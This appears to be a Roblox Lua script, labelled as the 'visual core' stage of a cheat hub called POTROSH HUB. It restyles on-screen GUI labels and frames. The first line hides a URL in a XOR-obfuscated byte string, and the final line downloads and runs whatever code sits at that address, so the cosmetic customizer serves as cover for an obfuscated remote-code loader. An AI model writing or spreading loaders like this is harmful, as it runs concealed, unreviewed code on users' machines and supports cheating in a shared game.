
--[[ STAGE 2: VISUAL CORE ]]
local LZhUu3iCpzyKsrIdMiUdh="\083\096\105\118\124\078\066\075\145\139\174\096\160\183\197\186\214\194\216\227\218\246\238\251\005\008\000\016\035\226\038\051\062\005\079\087\081\087\100\101\118\107\135\139\131\081\151\160\162\161\178\207\190\204\213\155\230\219\236\240\184\225\233\003\226\235\030\008\054\049\057\086\080\077\092\096\088\124\113\125\124\110\158\164\154\181\189\171\158\169\181\207\196\225\244\240\232\255\254\214\012\226\239\241\253\004\048\000\075\091\072"local T7h0itYIBXJ9=135 local MN6a0lKLZvqh=77 local V2yYlpKTV1uKBK=1 local ceg0gQv3h_R2a1jylEEax=7 local DpTm_RP6mY4JxE5=24 local xWPkegsjc2Xrv=false local RFy9vqk4blsVUd1_Gw=bit32 and bit32.bxor if not RFy9vqk4blsVUd1_Gw then RFy9vqk4blsVUd1_Gw=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local a_lFtWU5dFimlBU={}for eQwSVqpAVcRXMs9Zb=1,#LZhUu3iCpzyKsrIdMiUdh do local C6yztG_ERxcn0CiX7V2=string.byte(LZhUu3iCpzyKsrIdMiUdh,eQwSVqpAVcRXMs9Zb)local tZ2TgK7EREwels=(MN6a0lKLZvqh+(eQwSVqpAVcRXMs9Zb*ceg0gQv3h_R2a1jylEEax)+DpTm_RP6mY4JxE5)%256 if V2yYlpKTV1uKBK==0 then C6yztG_ERxcn0CiX7V2=(C6yztG_ERxcn0CiX7V2-tZ2TgK7EREwels)%256 a_lFtWU5dFimlBU[eQwSVqpAVcRXMs9Zb]=string.char(RFy9vqk4blsVUd1_Gw(C6yztG_ERxcn0CiX7V2,T7h0itYIBXJ9))else C6yztG_ERxcn0CiX7V2=RFy9vqk4blsVUd1_Gw(C6yztG_ERxcn0CiX7V2,T7h0itYIBXJ9)a_lFtWU5dFimlBU[eQwSVqpAVcRXMs9Zb]=string.char((C6yztG_ERxcn0CiX7V2-tZ2TgK7EREwels)%256)end end local uwffAII946_WEg=table.concat(a_lFtWU5dFimlBU)if xWPkegsjc2Xrv then uwffAII946_WEg=string.reverse(uwffAII946_WEg)end local HoopgKzp749wHO=uwffAII946_WEg
local HubName = "POTROSH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(HoopgKzp749wHO))()
